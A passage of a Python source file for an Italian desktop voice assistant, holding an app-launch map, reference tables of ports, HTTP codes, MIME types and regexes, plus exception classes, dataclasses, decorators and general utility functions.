    "skype": {"cmd": "skype", "aliases": ["microsoft skype"]},
    "zoom": {"cmd": "zoom", "aliases": ["zoom meeting"]},
    "slack": {"cmd": "slack", "aliases": []},
    
    # Development
    "visual studio code": {"cmd": "code", "aliases": ["vscode", "vs code", "code editor"]},
    "visual studio": {"cmd": "devenv", "aliases": ["vs", "studio"]},
    "pycharm": {"cmd": "pycharm64", "aliases": ["pycharm ide", "jetbrains pycharm"]},
    "intellij": {"cmd": "idea64", "aliases": ["intellij idea", "jetbrains intellij"]},
    "webstorm": {"cmd": "webstorm64", "aliases": ["jetbrains webstorm"]},
    "sublime text": {"cmd": "sublime_text", "aliases": ["sublime", "subl"]},
    "atom": {"cmd": "atom", "aliases": []},
    "notepad++": {"cmd": "notepad++", "aliases": ["npp", "notepadplusplus"]},
    "git bash": {"cmd": "git-bash", "aliases": ["gitbash", "bash"]},
    "github desktop": {"cmd": "github", "aliases": ["gh desktop"]},
    "postman": {"cmd": "postman", "aliases": ["api testing"]},
    "docker desktop": {"cmd": "docker", "aliases": ["docker"]},
    
    # Media
    "spotify": {"cmd": "spotify", "aliases": ["musica spotify"]},
    "vlc": {"cmd": "vlc", "aliases": ["vlc media player", "video player"]},
    "itunes": {"cmd": "itunes", "aliases": ["apple itunes"]},
    "windows media player": {"cmd": "wmplayer", "aliases": ["wmp", "media player"]},
    "audacity": {"cmd": "audacity", "aliases": ["audio editor"]},
    "obs studio": {"cmd": "obs64", "aliases": ["obs", "registrazione schermo", "streaming"]},
    "davinci resolve": {"cmd": "resolve", "aliases": ["davinci", "video editing"]},
    "premiere pro": {"cmd": "premiere", "aliases": ["adobe premiere"]},
    "after effects": {"cmd": "afterfx", "aliases": ["adobe after effects", "ae"]},
    
    # Graphics
    "photoshop": {"cmd": "photoshop", "aliases": ["adobe photoshop", "ps"]},
    "illustrator": {"cmd": "illustrator", "aliases": ["adobe illustrator", "ai"]},
    "gimp": {"cmd": "gimp-2.10", "aliases": ["gnu gimp"]},
    "blender": {"cmd": "blender", "aliases": ["3d modeling"]},
    "figma": {"cmd": "figma", "aliases": ["design figma"]},
    "canva": {"cmd": "canva", "aliases": []},
    
    # Gaming
    "steam": {"cmd": "steam", "aliases": ["valve steam", "giochi"]},
    "epic games": {"cmd": "epicgameslauncher", "aliases": ["epic", "epic launcher"]},
    "battle.net": {"cmd": "battle.net", "aliases": ["blizzard", "bnet"]},
    "origin": {"cmd": "origin", "aliases": ["ea origin"]},
    "gog galaxy": {"cmd": "galaxyclient", "aliases": ["gog"]},
    "ubisoft connect": {"cmd": "upc", "aliases": ["uplay"]},
    
    # Utilities
    "7zip": {"cmd": "7zFM", "aliases": ["7z", "archivio"]},
    "winrar": {"cmd": "winrar", "aliases": ["rar"]},
    "ccleaner": {"cmd": "ccleaner64", "aliases": ["cleaner"]},
    "everything": {"cmd": "everything", "aliases": ["ricerca file"]},
    "anydesk": {"cmd": "anydesk", "aliases": ["remote desktop anydesk"]},
    "teamviewer": {"cmd": "teamviewer", "aliases": ["remote desktop teamviewer"]},
    
    # Cloud Storage
    "dropbox": {"cmd": "dropbox", "aliases": []},
    "google drive": {"cmd": "googledrivesync", "aliases": ["drive", "gdrive"]},
    "onedrive": {"cmd": "onedrive", "aliases": ["microsoft onedrive"]},
}

# Common ports for scanning
COMMON_PORTS = {
    20: "FTP Data",
    21: "FTP Control",
    22: "SSH",
    23: "Telnet",
    25: "SMTP",
    53: "DNS",
    67: "DHCP Server",
    68: "DHCP Client",
    69: "TFTP",
    80: "HTTP",
    110: "POP3",
    119: "NNTP",
    123: "NTP",
    135: "RPC",
    137: "NetBIOS Name",
    138: "NetBIOS Datagram",
    139: "NetBIOS Session",
    143: "IMAP",
    161: "SNMP",
    162: "SNMP Trap",
    389: "LDAP",
    443: "HTTPS",
    445: "SMB",
    465: "SMTPS",
    514: "Syslog",
    515: "LPD",
    587: "SMTP Submission",
    636: "LDAPS",
    993: "IMAPS",
    995: "POP3S",
    1433: "MSSQL",
    1521: "Oracle",
    1723: "PPTP",
    3306: "MySQL",
    3389: "RDP",
    5432: "PostgreSQL",
    5900: "VNC",
    5901: "VNC-1",
    6379: "Redis",
    8080: "HTTP Proxy",
    8443: "HTTPS Alt",
    27017: "MongoDB",
}

# HTTP Status Codes
HTTP_STATUS_CODES = {
    100: "Continue",
    101: "Switching Protocols",
    200: "OK",
    201: "Created",
    202: "Accepted",
    204: "No Content",
    301: "Moved Permanently",
    302: "Found",
    304: "Not Modified",
    400: "Bad Request",
    401: "Unauthorized",
    403: "Forbidden",
    404: "Not Found",
    405: "Method Not Allowed",
    408: "Request Timeout",
    429: "Too Many Requests",
    500: "Internal Server Error",
    501: "Not Implemented",
    502: "Bad Gateway",
    503: "Service Unavailable",
    504: "Gateway Timeout",
}

# MIME Types
MIME_TYPES_EXTENDED = {
    ".py": "text/x-python",
    ".js": "application/javascript",
    ".ts": "application/typescript",
    ".json": "application/json",
    ".xml": "application/xml",
    ".yaml": "application/x-yaml",
    ".yml": "application/x-yaml",
    ".md": "text/markdown",
    ".rst": "text/x-rst",
    ".sql": "application/sql",
    ".sh": "application/x-sh",
    ".bat": "application/x-bat",
    ".ps1": "application/x-powershell",
}

# Regex patterns
REGEX_PATTERNS = {
    "email": re.compile(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"),
    "url": re.compile(r"https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+[^\s]*"),
    "ip_v4": re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b"),
    "ip_v6": re.compile(r"(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}"),
    "mac_address": re.compile(r"(?:[0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}"),
    "phone_it": re.compile(r"\+?39?\s*\d{2,4}[\s.-]?\d{6,8}"),
    "credit_card": re.compile(r"\b(?:\d{4}[-\s]?){3}\d{4}\b"),
    "date_iso": re.compile(r"\d{4}-\d{2}-\d{2}"),
    "date_eu": re.compile(r"\d{2}/\d{2}/\d{4}"),
    "time_24h": re.compile(r"\b([01]?\d|2[0-3]):[0-5]\d(:[0-5]\d)?\b"),
    "hex_color": re.compile(r"#(?:[0-9a-fA-F]{3}){1,2}\b"),
    "uuid": re.compile(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"),
    "jwt": re.compile(r"eyJ[A-Za-z0-9-_=]+\.eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_.+/=]*"),
    "base64": re.compile(r"^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$"),
    "hash_md5": re.compile(r"\b[a-fA-F0-9]{32}\b"),
    "hash_sha1": re.compile(r"\b[a-fA-F0-9]{40}\b"),
    "hash_sha256": re.compile(r"\b[a-fA-F0-9]{64}\b"),
}

# Weekdays and months in Italian
WEEKDAYS_IT = ["lunedì", "martedì", "mercoledì", "giovedì", "venerdì", "sabato", "domenica"]
MONTHS_IT = ["gennaio", "febbraio", "marzo", "aprile", "maggio", "giugno",
             "luglio", "agosto", "settembre", "ottobre", "novembre", "dicembre"]

# Error messages
ERROR_MESSAGES = {
    "generic": "Si è verificato un errore imprevisto.",
    "network": "Errore di connessione di rete.",
    "timeout": "Operazione scaduta per timeout.",
    "permission": "Permessi insufficienti per questa operazione.",
    "not_found": "Risorsa non trovata.",
    "invalid_input": "Input non valido.",
    "api_error": "Errore nella comunicazione con l'API.",
    "auth_error": "Errore di autenticazione.",
    "config_error": "Errore di configurazione.",
    "dependency_missing": "Dipendenza mancante: {}",
}

import sys as _sys
if hasattr(_sys.stdout, "reconfigure"):
    try:
        _sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        _sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception as _e:
        pass  # suppressed error

print(f"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                     F.R.A.N.C.O. 6.0 — NEXUS EDITION                        ║
║              Full Responsive Autonomous Neural Control Operator              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  Sistema: {SYSTEM_PLATFORM} {SYSTEM_RELEASE}
║  Python:  {PYTHON_VERSION}
║  Build:   {__version__} ({__codename__})
╚══════════════════════════════════════════════════════════════════════════════╝
""")

# Print dependency status
print("Dipendenze caricate:")
for dep, status in sorted(DEPENDENCIES_STATUS.items()):
    icon = "✓" if status else "✗"
    print(f"  [{icon}] {dep}")
print()

# ==============================================================================
# PARTE 2: UTILITY CLASSES, DECORATORS, AND HELPERS
# ==============================================================================


from franco_patch_dual_ai import (
       MistralAIClient, DualAIRouter, RealFileSaver, patch_command_engine
   )
# AGGIUNTA: modulo analisi YouTube
try:
    from franco_youtube_ai import run_pipeline as youtube_run_pipeline
    YOUTUBE_MODULE_AVAILABLE = True
except ImportError:
    YOUTUBE_MODULE_AVAILABLE = False

# ==============================================================================
# CUSTOM EXCEPTIONS
# ==============================================================================

class FrancoException(Exception):
    """Base exception for FRANCO system"""
    def __init__(self, message: str, code: str = "GENERIC", details: Dict = None):
        self.message = message
        self.code = code
        self.details = details or {}
        self.timestamp = datetime.now()
        super().__init__(self.message)
    
    def to_dict(self) -> Dict:
        return {
            "error": self.code,
            "message": self.message,
            "details": self.details,
            "timestamp": self.timestamp.isoformat()
        }


class ConfigurationError(FrancoException):
    """Configuration-related errors"""
    def __init__(self, message: str, details: Dict = None):
        super().__init__(message, "CONFIG_ERROR", details)


class NetworkError(FrancoException):
    """Network-related errors"""
    def __init__(self, message: str, details: Dict = None):
        super().__init__(message, "NETWORK_ERROR", details)


class SecurityError(FrancoException):
    """Security-related errors"""
    def __init__(self, message: str, details: Dict = None):
        super().__init__(message, "SECURITY_ERROR", details)


class APIError(FrancoException):
    """API-related errors"""
    def __init__(self, message: str, details: Dict = None):
        super().__init__(message, "API_ERROR", details)


class ValidationError(FrancoException):
    """Validation-related errors"""
    def __init__(self, message: str, details: Dict = None):
        super().__init__(message, "VALIDATION_ERROR", details)


class ResourceNotFoundError(FrancoException):
    """Resource not found errors"""
    def __init__(self, message: str, details: Dict = None):
        super().__init__(message, "NOT_FOUND", details)


class PermissionDeniedError(FrancoException):
    """Permission denied errors"""
    def __init__(self, message: str, details: Dict = None):
        super().__init__(message, "PERMISSION_DENIED", details)


class TimeoutError(FrancoException):
    """Timeout errors"""
    def __init__(self, message: str, details: Dict = None):
        super().__init__(message, "TIMEOUT", details)


class DependencyError(FrancoException):
    """Missing dependency errors"""
    def __init__(self, dependency: str, details: Dict = None):
        message = f"Dipendenza mancante: {dependency}"
        super().__init__(message, "DEPENDENCY_MISSING", details)
        self.dependency = dependency


# ==============================================================================
# ENUMERATIONS
# ==============================================================================

class LogLevel(IntEnum):
    """Log severity levels"""
    TRACE = 5
    DEBUG = 10
    INFO = 20
    SUCCESS = 25
    WARNING = 30
    ERROR = 40
    CRITICAL = 50


class SystemState(Enum):
    """System state enumeration"""
    INITIALIZING = auto()
    IDLE = auto()
    LISTENING = auto()
    PROCESSING = auto()
    SPEAKING = auto()
    THINKING = auto()
    STANDBY = auto()
    ERROR = auto()
    SHUTDOWN = auto()


class CommandCategory(Enum):
    """Command categories for organization"""
    SYSTEM = "system"
    FILE = "file"
    WEB = "web"
    MEDIA = "media"
    AUTOMATION = "automation"
    SECURITY = "security"
    NETWORK = "network"
    DEVELOPMENT = "development"
    PRODUCTIVITY = "productivity"
    COMMUNICATION = "communication"
    AI = "ai"
    CUSTOM = "custom"


class Priority(IntEnum):
    """Task priority levels"""
    LOWEST = 1
    LOW = 2
    NORMAL = 3
    HIGH = 4
    HIGHEST = 5
    CRITICAL = 6


class MoodType(Enum):
    """Detected mood types"""
    NEUTRAL = "neutro"
    URGENT = "urgente"
    STRESSED = "stress"
    POSITIVE = "positivo"
    CURIOUS = "curioso"
    FRUSTRATED = "frustrato"
    EXCITED = "eccitato"


class SecurityLevel(IntEnum):
    """Security clearance levels"""
    PUBLIC = 0
    BASIC = 1
    ELEVATED = 2
    ADMIN = 3
    SYSTEM = 4


# ==============================================================================
# DATA CLASSES
# ==============================================================================

@dataclass
class EventData:
    """Event data structure"""
    event_type: str
    data: Any
    timestamp: datetime = field(default_factory=datetime.now)
    source: str = "system"
    priority: Priority = Priority.NORMAL
    metadata: Dict = field(default_factory=dict)


@dataclass
class CommandResult:
    """Result of command execution"""
    success: bool
    message: str
    data: Any = None
    execution_time: float = 0.0
    category: CommandCategory = CommandCategory.SYSTEM
    metadata: Dict = field(default_factory=dict)


@dataclass
class NetworkScanResult:
    """Network scan result"""
    host: str
    port: int
    state: str  # open, closed, filtered
    service: str = ""
    version: str = ""
    latency: float = 0.0
    metadata: Dict = field(default_factory=dict)


@dataclass
class VulnerabilityInfo:
    """Vulnerability information"""
    name: str
    severity: str  # low, medium, high, critical
    description: str
    cve_id: str = ""
    affected_component: str = ""
    remediation: str = ""
    references: List[str] = field(default_factory=list)


@dataclass
class PasswordAnalysis:
    """Password strength analysis result"""
    password: str
    length: int
    score: int  # 0-100
    strength: str  # weak, fair, good, strong, excellent
    has_lowercase: bool = False
    has_uppercase: bool = False
    has_digits: bool = False
    has_special: bool = False
    has_common_pattern: bool = False
    suggestions: List[str] = field(default_factory=list)


@dataclass
class FileInfo:
    """File information structure"""
    path: str
    name: str
    extension: str
    size: int
    size_human: str
    created: datetime
    modified: datetime
    accessed: datetime
    is_file: bool
    is_dir: bool
    is_symlink: bool
    permissions: str
    owner: str = ""
    mime_type: str = ""
    hash_md5: str = ""
    hash_sha256: str = ""


@dataclass 
class ProcessInfo:
    """Process information structure"""
    pid: int
    name: str
    status: str
    cpu_percent: float
    memory_percent: float
    memory_mb: float
    threads: int
    username: str = ""
    created: datetime = None
    cmdline: str = ""


@dataclass
class SystemMetrics:
    """System performance metrics"""
    timestamp: datetime
    cpu_percent: float
    cpu_freq_mhz: float
    cpu_cores: int
    memory_total_gb: float
    memory_used_gb: float
    memory_percent: float
    disk_total_gb: float
    disk_used_gb: float
    disk_percent: float
    network_sent_mb: float
    network_recv_mb: float
    boot_time: datetime
    uptime_seconds: float


@dataclass
class ConversationMessage:
    """Conversation message structure"""
    role: str  # user, assistant, system
    content: str
    timestamp: datetime = field(default_factory=datetime.now)
    mood: MoodType = MoodType.NEUTRAL
    tokens: int = 0
    metadata: Dict = field(default_factory=dict)


@dataclass
class ScheduledTask:
    """Scheduled task structure"""
    id: str
    name: str
    command: str
    schedule_type: str  # once, interval, cron
    next_run: datetime
    last_run: Optional[datetime] = None
    interval_seconds: int = 0
    cron_expression: str = ""
    enabled: bool = True
    run_count: int = 0
    max_runs: int = 0  # 0 = unlimited
    metadata: Dict = field(default_factory=dict)


@dataclass
class WorkflowStep:
    """Workflow step structure"""
    id: str
    name: str
    action: str
    parameters: Dict = field(default_factory=dict)
    condition: str = ""
    on_success: str = ""  # next step id
    on_failure: str = ""  # next step id or "abort"
    timeout: int = 30
    retries: int = 0


@dataclass
class Workflow:
    """Workflow structure"""
    id: str
    name: str
    description: str
    steps: List[WorkflowStep]
    created: datetime = field(default_factory=datetime.now)
    modified: datetime = field(default_factory=datetime.now)
    enabled: bool = True
    tags: List[str] = field(default_factory=list)


# ==============================================================================
# DECORATORS
# ==============================================================================

def singleton(cls):
    """Singleton pattern decorator"""
    instances = {}
    lock = threading.Lock()
    
    @wraps(cls)
    def get_instance(*args, **kwargs):
        if cls not in instances:
            with lock:
                if cls not in instances:
                    instances[cls] = cls(*args, **kwargs)
        return instances[cls]
    
    return get_instance


def retry(max_attempts: int = 3, delay: float = 1.0, backoff: float = 2.0,
          exceptions: Tuple[Type[Exception], ...] = (Exception,)):
    """Retry decorator with exponential backoff"""
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            last_exception = None
            current_delay = delay
            
            for attempt in range(max_attempts):
                try:
                    return func(*args, **kwargs)
                except exceptions as e:
                    last_exception = e
                    if attempt < max_attempts - 1:
                        time.sleep(current_delay)
                        current_delay *= backoff
            
            raise last_exception
        
        @wraps(func)
        async def async_wrapper(*args, **kwargs):
            last_exception = None
            current_delay = delay
            
            for attempt in range(max_attempts):
                try:
                    return await func(*args, **kwargs)
                except exceptions as e:
                    last_exception = e
                    if attempt < max_attempts - 1:
                        await asyncio.sleep(current_delay)
                        current_delay *= backoff
            
            raise last_exception
        
        if inspect.iscoroutinefunction(func):
            return async_wrapper
        return wrapper
    
    return decorator


def cached(ttl: int = 300, maxsize: int = 128):
    """Caching decorator with TTL"""
    def decorator(func):
        cache = OrderedDict()
        cache_times = {}
        lock = threading.Lock()
        
        @wraps(func)
        def wrapper(*args, **kwargs):
            # Create cache key
            key = (args, tuple(sorted(kwargs.items())))
            current_time = time.time()
            
            with lock:
                # Check if cached and not expired
                if key in cache:
                    if current_time - cache_times[key] < ttl:
                        cache.move_to_end(key)
                        return cache[key]
                    else:
                        del cache[key]
                        del cache_times[key]
                
                # Execute function
                result = func(*args, **kwargs)
                
                # Store in cache
                cache[key] = result
                cache_times[key] = current_time
                
                # Enforce max size
                while len(cache) > maxsize:
                    oldest = next(iter(cache))
                    del cache[oldest]
                    del cache_times[oldest]
                
                return result
        
        def clear_cache():
            with lock:
                cache.clear()
                cache_times.clear()
        
        wrapper.clear_cache = clear_cache
        wrapper.cache = cache
        return wrapper
    
    return decorator


def timed(func):
    """Execution time measurement decorator"""
    @wraps(func)
    def wrapper(*args, **kwargs):
        start = time.perf_counter()
        result = func(*args, **kwargs)
        elapsed = time.perf_counter() - start
        
        # Log timing
        func_name = func.__name__
        if elapsed > 1.0:
            print(f"[TIMING] {func_name}: {elapsed:.3f}s")
        
        return result
    
    @wraps(func)
    async def async_wrapper(*args, **kwargs):
        start = time.perf_counter()
        result = await func(*args, **kwargs)
        elapsed = time.perf_counter() - start
        
        func_name = func.__name__
        if elapsed > 1.0:
            print(f"[TIMING] {func_name}: {elapsed:.3f}s")
        
        return result
    
    if asyncio.iscoroutinefunction(func):
        return async_wrapper
    return wrapper


def thread_safe(func):
    """Thread safety decorator using a lock"""
    lock = threading.Lock()
    
    @wraps(func)
    def wrapper(*args, **kwargs):
        with lock:
            return func(*args, **kwargs)
    
    return wrapper


def async_to_sync(func):
    """Convert async function to sync"""
    @wraps(func)
    def wrapper(*args, **kwargs):
        loop = asyncio.new_event_loop()
        try:
            return loop.run_until_complete(func(*args, **kwargs))
        finally:
            loop.close()
    
    return wrapper


def require_dependency(*deps):
    """Check for required dependencies"""
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            missing = [d for d in deps if not DEPENDENCIES_STATUS.get(d, False)]
            if missing:
                raise DependencyError(", ".join(missing))
            return func(*args, **kwargs)
        return wrapper
    return decorator


def log_call(level: LogLevel = LogLevel.DEBUG):
    """Log function calls"""
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            func_name = func.__name__
            # Simplified logging - would use proper logger
            if level <= LogLevel.DEBUG:
                print(f"[CALL] {func_name}({args}, {kwargs})")
            
            try:
                result = func(*args, **kwargs)
                return result
            except Exception as e:
                print(f"[ERROR] {func_name}: {e}")
                raise
        
        return wrapper
    return decorator


def validate_args(**validators):
    """Argument validation decorator"""
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            # Get function signature
            sig = inspect.signature(func)
            bound = sig.bind(*args, **kwargs)
            bound.apply_defaults()
            
            # Validate arguments
            for arg_name, validator in validators.items():
                if arg_name in bound.arguments:
                    value = bound.arguments[arg_name]
                    if not validator(value):
                        raise ValidationError(f"Invalid value for '{arg_name}': {value}")
            
            return func(*args, **kwargs)
        return wrapper
    return decorator


def deprecated(message: str = "", version: str = ""):
    """Mark function as deprecated"""
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            warn_msg = f"{func.__name__} is deprecated"
            if version:
                warn_msg += f" since version {version}"
            if message:
                warn_msg += f": {message}"
            warnings.warn(warn_msg, DeprecationWarning, stacklevel=2)
            return func(*args, **kwargs)
        return wrapper
    return decorator


def rate_limit(calls: int, period: float):
    """Rate limiting decorator"""
    def decorator(func):
        call_times = deque()
        lock = threading.Lock()
        
        @wraps(func)
        def wrapper(*args, **kwargs):
            current_time = time.time()
            
            with lock:
                # Remove old calls outside the period
                while call_times and current_time - call_times[0] > period:
                    call_times.popleft()
                
                # Check rate limit
                if len(call_times) >= calls:
                    wait_time = period - (current_time - call_times[0])
                    raise FrancoException(
                        f"Rate limit exceeded. Try again in {wait_time:.1f}s",
                        "RATE_LIMITED"
                    )
                
                call_times.append(current_time)
            
            return func(*args, **kwargs)
        
        return wrapper
    return decorator


def circuit_breaker(failure_threshold: int = 5, recovery_timeout: float = 30.0):
    """Circuit breaker pattern decorator"""
    def decorator(func):
        failures = 0
        last_failure_time = 0
        is_open = False
        lock = threading.Lock()
        
        @wraps(func)
        def wrapper(*args, **kwargs):
            nonlocal failures, last_failure_time, is_open
            current_time = time.time()
            
            with lock:
                # Check if circuit should be closed (recovery)
                if is_open:
                    if current_time - last_failure_time > recovery_timeout:
                        is_open = False
                        failures = 0
                    else:
                        raise FrancoException(
                            "Circuit breaker is open",
                            "CIRCUIT_OPEN"
                        )
            
            try:
                result = func(*args, **kwargs)
                with lock:
                    failures = 0
                return result
            except Exception as e:
                with lock:
                    failures += 1
                    last_failure_time = current_time
                    if failures >= failure_threshold:
                        is_open = True
                raise
        
        def reset():
            nonlocal failures, is_open
            with lock:
                failures = 0
                is_open = False
        
        wrapper.reset = reset
        return wrapper
    
    return decorator


# ==============================================================================
# UTILITY FUNCTIONS
# ==============================================================================

def get_theme() -> Dict:
    """Get current theme colors"""
    return THEMES.get(ACTIVE_THEME, THEMES["nexus"])


def format_bytes(size: int) -> str:
    """Format bytes to human readable string"""
    for unit in ['B', 'KB', 'MB', 'GB', 'TB', 'PB']:
        if abs(size) < 1024.0:
            return f"{size:.1f} {unit}"
        size /= 1024.0
    return f"{size:.1f} EB"


def format_duration(seconds: float) -> str:
    """Format duration to human readable string"""
    if seconds < 60:
        return f"{seconds:.1f}s"
    elif seconds < 3600:
        minutes = seconds / 60
        return f"{minutes:.1f}m"
    elif seconds < 86400:
        hours = seconds / 3600
        return f"{hours:.1f}h"
    else:
        days = seconds / 86400
        return f"{days:.1f}d"


def truncate(text: str, max_length: int = 100, suffix: str = "...") -> str:
    """Truncate text to maximum length"""
    if len(text) <= max_length:
        return text
    return text[:max_length - len(suffix)] + suffix


def slugify(text: str) -> str:
    """Convert text to URL-safe slug"""
    # Normalize unicode
    text = unicodedata.normalize('NFKD', text)
    text = text.encode('ascii', 'ignore').decode('ascii')
    # Convert to lowercase and replace spaces
    text = text.lower().strip()
    text = re.sub(r'[^\w\s-]', '', text)
    text = re.sub(r'[-\s]+', '-', text)
    return text


def generate_id(prefix: str = "", length: int = 8) -> str:
    """Generate unique ID"""
    uid = uuid.uuid4().hex[:length]
    return f"{prefix}{uid}" if prefix else uid


def generate_password(length: int = 16, include_special: bool = True) -> str:
    """Generate secure random password"""
    chars = string.ascii_letters + string.digits
    if include_special:
        chars += string.punctuation
    
    # Ensure at least one of each required type
    password = [
        secrets.choice(string.ascii_lowercase),
        secrets.choice(string.ascii_uppercase),
        secrets.choice(string.digits),
    ]
    if include_special:
        password.append(secrets.choice(string.punctuation))
    
    # Fill remaining length
    password.extend(secrets.choice(chars) for _ in range(length - len(password)))
    
    # Shuffle
    random.shuffle(password)
    return ''.join(password)


def hash_text(text: str, algorithm: str = "sha256") -> str:
    """Hash text using specified algorithm"""
    algorithms = {
        "md5": hashlib.md5,
        "sha1": hashlib.sha1,
        "sha256": hashlib.sha256,
        "sha512": hashlib.sha512,
    }
    hasher = algorithms.get(algorithm, hashlib.sha256)
    return hasher(text.encode()).hexdigest()


def verify_hash(text: str, hash_value: str, algorithm: str = "sha256") -> bool:
    """Verify text against hash"""
    return hash_text(text, algorithm) == hash_value


def encode_base64(data: Union[str, bytes]) -> str:
    """Encode data to base64"""
    if isinstance(data, str):
        data = data.encode()
    return base64.b64encode(data).decode()


def decode_base64(data: str) -> bytes:
    """Decode base64 data"""
    return base64.b64decode(data)


def is_valid_email(email: str) -> bool:
    """Validate email address"""
    return bool(REGEX_PATTERNS["email"].fullmatch(email))


def is_valid_url(url: str) -> bool:
    """Validate URL"""
    return bool(REGEX_PATTERNS["url"].match(url))


def is_valid_ip(ip: str) -> bool:
    """Validate IP address (v4 or v6)"""
    return bool(REGEX_PATTERNS["ip_v4"].fullmatch(ip) or 
                REGEX_PATTERNS["ip_v6"].fullmatch(ip))


def extract_emails(text: str) -> List[str]:
    """Extract all email addresses from text"""
    return REGEX_PATTERNS["email"].findall(text)


def extract_urls(text: str) -> List[str]:
    """Extract all URLs from text"""
    return REGEX_PATTERNS["url"].findall(text)


def extract_ips(text: str) -> List[str]:
    """Extract all IP addresses from text"""
    ipv4 = REGEX_PATTERNS["ip_v4"].findall(text)
    ipv6 = REGEX_PATTERNS["ip_v6"].findall(text)
    return ipv4 + ipv6


def get_file_hash(path: str, algorithm: str = "sha256", chunk_size: int = 8192) -> str:
    """Calculate file hash"""
    algorithms = {
        "md5": hashlib.md5,
        "sha1": hashlib.sha1,
        "sha256": hashlib.sha256,
        "sha512": hashlib.sha512,
    }
    hasher = algorithms.get(algorithm, hashlib.sha256)()
    
    with open(path, 'rb') as f:
        while chunk := f.read(chunk_size):
            hasher.update(chunk)
    
    return hasher.hexdigest()


def get_file_info(path: str) -> FileInfo:
    """Get detailed file information"""
    p = Path(path)
    stat = p.stat()
    
    # Get MIME type
    mime_type, _ = mimetypes.guess_type(path)
    
    return FileInfo(
        path=str(p.absolute()),
        name=p.name,
        extension=p.suffix,
        size=stat.st_size,
        size_human=format_bytes(stat.st_size),
        created=datetime.fromtimestamp(stat.st_ctime),
        modified=datetime.fromtimestamp(stat.st_mtime),
        accessed=datetime.fromtimestamp(stat.st_atime),
        is_file=p.is_file(),
        is_dir=p.is_dir(),
        is_symlink=p.is_symlink(),
        permissions=oct(stat.st_mode)[-3:],
        mime_type=mime_type or "application/octet-stream"
    )


def safe_json_loads(text: str, default: Any = None) -> Any:
    """Safely parse JSON with default value"""
    try:
        return json.loads(text)
    except (json.JSONDecodeError, TypeError):
        return default


def safe_json_dumps(data: Any, default: str = "{}") -> str:
    """Safely serialize to JSON with default value"""
    try:
        return json.dumps(data, ensure_ascii=False, default=str)
    except (TypeError, ValueError):
        return default


def merge_dicts(*dicts: Dict) -> Dict:
    """Deep merge multiple dictionaries"""
    result = {}
    for d in dicts:
        for key, value in d.items():
            if key in result and isinstance(result[key], dict) and isinstance(value, dict):
                result[key] = merge_dicts(result[key], value)
            else:
                result[key] = value
    return result


def flatten_dict(d: Dict, parent_key: str = '', sep: str = '.') -> Dict:
    """Flatten nested dictionary"""
    items = []
    for k, v in d.items():
        new_key = f"{parent_key}{sep}{k}" if parent_key else k
        if isinstance(v, dict):
            items.extend(flatten_dict(v, new_key, sep).items())
        else:
            items.append((new_key, v))
    return dict(items)


def unflatten_dict(d: Dict, sep: str = '.') -> Dict:
    """Unflatten dictionary"""
    result = {}
    for key, value in d.items():
        keys = key.split(sep)
        current = result
        for k in keys[:-1]:
            current = current.setdefault(k, {})
        current[keys[-1]] = value
    return result


def chunk_list(lst: List, chunk_size: int) -> List[List]:
    """Split list into chunks"""
    return [lst[i:i + chunk_size] for i in range(0, len(lst), chunk_size)]


def unique_list(lst: List, key: Callable = None) -> List:
    """Remove duplicates from list while preserving order"""
    seen = set()
    result = []
    for item in lst:
        k = key(item) if key else item
        if k not in seen:
            seen.add(k)
            result.append(item)
    return result


def levenshtein_distance(s1: str, s2: str) -> int:
    """Calculate Levenshtein distance between two strings"""
    if len(s1) < len(s2):
        return levenshtein_distance(s2, s1)
    
    if len(s2) == 0:
        return len(s1)
    
    previous_row = range(len(s2) + 1)
    for i, c1 in enumerate(s1):
        current_row = [i + 1]
        for j, c2 in enumerate(s2):
            insertions = previous_row[j + 1] + 1
            deletions = current_row[j] + 1
            substitutions = previous_row[j] + (c1 != c2)
            current_row.append(min(insertions, deletions, substitutions))
        previous_row = current_row
    
    return previous_row[-1]


def fuzzy_match(query: str, candidates: List[str], threshold: float = 0.6) -> List[Tuple[str, float]]:
    """Fuzzy match query against candidates"""
    query_lower = query.lower()
    results = []
    
    for candidate in candidates:
        candidate_lower = candidate.lower()
        
        # Exact match
        if query_lower == candidate_lower:
            results.append((candidate, 1.0))
            continue
        
        # Contains
        if query_lower in candidate_lower or candidate_lower in query_lower:
            ratio = len(query_lower) / max(len(candidate_lower), 1)
            results.append((candidate, min(0.95, ratio + 0.5)))
            continue
        
        # Levenshtein similarity
        distance = levenshtein_distance(query_lower, candidate_lower)
        max_len = max(len(query_lower), len(candidate_lower))
        similarity = 1 - (distance / max_len)
        
        if similarity >= threshold:
            results.append((candidate, similarity))
    
    # Sort by similarity descending
    results.sort(key=lambda x: x[1], reverse=True)
    return results


def get_current_datetime_formatted() -> str:
    """Get current datetime in Italian format"""
    now = datetime.now()
    weekday = WEEKDAYS_IT[now.weekday()]
    month = MONTHS_IT[now.month - 1]
    return f"{weekday}, {now.day} {month} {now.year}, ore {now.strftime('%H:%M')}"


def parse_time_expression(text: str) -> Optional[int]:
    """Parse time expression to seconds"""
    text = text.lower().strip()
    
    patterns = [
        (r"(\d+)\s*(secondi?|sec|s)", 1),
        (r"(\d+)\s*(minuti?|min|m)", 60),
        (r"(\d+)\s*(ore?|hour?|h)", 3600),
        (r"(\d+)\s*(giorni?|day?|d|gg)", 86400),
    ]
    
    total_seconds = 0
    found = False
    
    for pattern, multiplier in patterns:
        match = re.search(pattern, text)
        if match:
            value = int(match.group(1))
            total_seconds += value * multiplier
            found = True
    
